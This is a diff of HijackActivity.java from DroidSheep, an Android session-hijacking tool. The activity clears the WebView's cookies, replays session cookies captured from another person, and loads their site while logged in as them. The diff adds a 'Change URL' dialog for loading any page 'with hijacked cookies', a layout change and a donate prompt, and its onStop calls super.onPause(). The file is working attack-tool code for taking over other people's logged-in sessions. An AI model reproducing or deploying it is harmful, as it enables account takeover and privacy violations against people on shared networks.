@@ -1,28 +1,32 @@
-/*    	HijackActivity.java is the WebView Activity setting up the cookies
-    	Copyright (C) 2011 Andreas Koch <koch.trier@gmail.com>
-    	
-    	This software was supported by the University of Trier 
-
-	    This program is free software; you can redistribute it and/or modify
-	    it under the terms of the GNU General Public License as published by
-	    the Free Software Foundation; either version 3 of the License, or
-	    (at your option) any later version.
-	
-	    This program is distributed in the hope that it will be useful,
-	    but WITHOUT ANY WARRANTY; without even the implied warranty of
-	    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-	    GNU General Public License for more details.
-	
-	    You should have received a copy of the GNU General Public License along
-	    with this program; if not, write to the Free Software Foundation, Inc.,
-	    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. */
-
+/*
+ * HijackActivity.java is the WebView Activity setting up the cookies Copyright
+ * (C) 2011 Andreas Koch <koch.trier@gmail.com>
+ * 
+ * This software was supported by the University of Trier
+ * 
+ * This program is free software; you can redistribute it and/or modify it under
+ * the terms of the GNU General Public License as published by the Free Software
+ * Foundation; either version 3 of the License, or (at your option) any later
+ * version.
+ * 
+ * This program is distributed in the hope that it will be useful, but WITHOUT
+ * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
+ * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
+ * details.
+ * 
+ * You should have received a copy of the GNU General Public License along with
+ * this program; if not, write to the Free Software Foundation, Inc., 51
+ * Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+ */
 
 package de.trier.infsec.koch.droidsheep.activities;
 
 import org.apache.http.cookie.Cookie;
 
 import android.app.Activity;
+import android.app.AlertDialog;
+import android.content.DialogInterface;
+import android.content.Intent;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.KeyEvent;
@@ -35,12 +39,12 @@ import android.webkit.WebChromeClient;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import android.widget.LinearLayout;
+import android.widget.EditText;
 import android.widget.Toast;
 import de.trier.infsec.koch.droidsheep.R;
 import de.trier.infsec.koch.droidsheep.auth.Auth;
+import de.trier.infsec.koch.droidsheep.helper.DBHelper;
 import de.trier.infsec.koch.droidsheep.objects.CookieWrapper;
-
 
 public class HijackActivity extends Activity {
 	private WebView webview = null;
@@ -57,11 +61,14 @@ public class HijackActivity extends Activity {
 	private void setupCookies() {
 		Log.i("FS", "######################## COOKIE SETUP ###############################");
 		CookieManager manager = CookieManager.getInstance();
-		Log.i("FS", "Cookiemanager has cookies: " + (manager.hasCookies()?"YES":"NO"));
-		if (manager.hasCookies()) {			
+		Log.i("FS", "Cookiemanager has cookies: " + (manager.hasCookies() ? "YES" : "NO"));
+		if (manager.hasCookies()) {
 			manager.removeAllCookie();
-			try {Thread.sleep(3000);} catch (InterruptedException e) {}
-			Log.i("FS", "Cookiemanager has still cookies: " + (manager.hasCookies()?"YES":"NO"));	
+			try {
+				Thread.sleep(3000);
+			} catch (InterruptedException e) {
+			}
+			Log.i("FS", "Cookiemanager has still cookies: " + (manager.hasCookies() ? "YES" : "NO"));
 		}
 		Log.i("FS", "######################## COOKIE SETUP START ###############################");
 		for (CookieWrapper cookieWrapper : authToHijack.getCookies()) {
@@ -78,11 +85,14 @@ public class HijackActivity extends Activity {
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
+		getWindow().requestFeature(Window.FEATURE_PROGRESS);
+		setContentView(R.layout.webview);
 		CookieSyncManager.createInstance(this);
 	}
-	
+
 	private void setupWebView() {
-		webview = new WebView(this);
+		//		webview = new WebView(this);
+		webview = (WebView) findViewById(R.id.webviewhijack);
 		webview.setWebViewClient(new MyWebViewClient());
 		WebSettings webSettings = webview.getSettings();
 		webSettings.setUserAgentString("foo");
@@ -105,14 +115,15 @@ public class HijackActivity extends Activity {
 		return super.onKeyDown(keyCode, event);
 	}
 
-	//Menü Items
+	//Menu Items
 	@Override
 	public boolean onCreateOptionsMenu(Menu menu) {
 		super.onCreateOptionsMenu(menu);
-		menu.add(0, 0, 0, "BACK");
-		menu.add(0, 1, 0, "FORWARD");
-		menu.add(1, 2, 0, "RELOAD");
-		menu.add(1, 3, 0, "CLOSE");
+		menu.add(0, 0, 0, "Back");
+		menu.add(0, 1, 0, "Forward");
+		menu.add(1, 2, 0, "Reload");
+		menu.add(1, 3, 0, "Close Website");
+		menu.add(1, 4, 0, "Change URL");
 		return true;
 	}
 
@@ -134,8 +145,31 @@ public class HijackActivity extends Activity {
 		case 3:
 			this.finish();
 			break;
+		case 4:
+			selectURL();
+			break;
 		}
 		return false;
+	}
+
+	private void selectURL() {
+		AlertDialog.Builder alert = new AlertDialog.Builder(this);
+
+		alert.setTitle("Change URL");
+		alert.setMessage("Insert custom URL to load with hijacked cookies");
+
+		// Set an EditText view to get user input   
+		final EditText inputName = new EditText(this);
+		inputName.setText(HijackActivity.this.webview.getUrl());
+		alert.setView(inputName);
+
+		alert.setPositiveButton("Go", new DialogInterface.OnClickListener() {
+			public void onClick(DialogInterface dialog, int whichButton) {
+				HijackActivity.this.webview.loadUrl(inputName.getText().toString());
+			}
+		});
+
+		alert.show();
 	}
 
 	@Override
@@ -151,25 +185,40 @@ public class HijackActivity extends Activity {
 		}
 
 		boolean mobile = this.getIntent().getExtras().getBoolean("MOBILE");
-		String url = mobile?authToHijack.getMobileUrl():authToHijack.getUrl();
+		String url = mobile ? authToHijack.getMobileUrl() : authToHijack.getUrl();
 
 		setupWebView();
-		getWindow().requestFeature(Window.FEATURE_PROGRESS);
-		getWindow().requestFeature(Window.FEATURE_PROGRESS);
-		setContentView(R.layout.webview);
-		LinearLayout layout = (LinearLayout) findViewById(R.id.hijack);
-		layout.removeAllViews();
-		layout.addView(webview);
-		
+		//		getWindow().requestFeature(Window.FEATURE_PROGRESS);
+		//		setContentView(R.layout.webview);
+		//		LinearLayout layout = (LinearLayout) findViewById(R.id.hijack);
+		//		layout.removeAllViews();
+		//		layout.addView(webview);
+
 		setupCookies();
-		Log.e("FS", "###################################### LOAD #############################################");
 		webview.loadUrl(url);
 	}
-	
+
 	@Override
 	protected void onStop() {
 		super.onPause();
+		showDonate();
 		finish();
+	}
+
+	@Override
+	protected void onDestroy() {
+		super.onDestroy();
+	}
+
+	private void showDonate() {
+		long last = DBHelper.getLastDonateMessage(this);
+		long now = System.currentTimeMillis();
+		long dif = now - last;
+
+		if (dif > (14 * 24 * 60 * 60 * 1000)) {
+			Intent i = new Intent(HijackActivity.this, DonateActivity.class);
+			startActivity(i);
+		}
 	}
 
 }
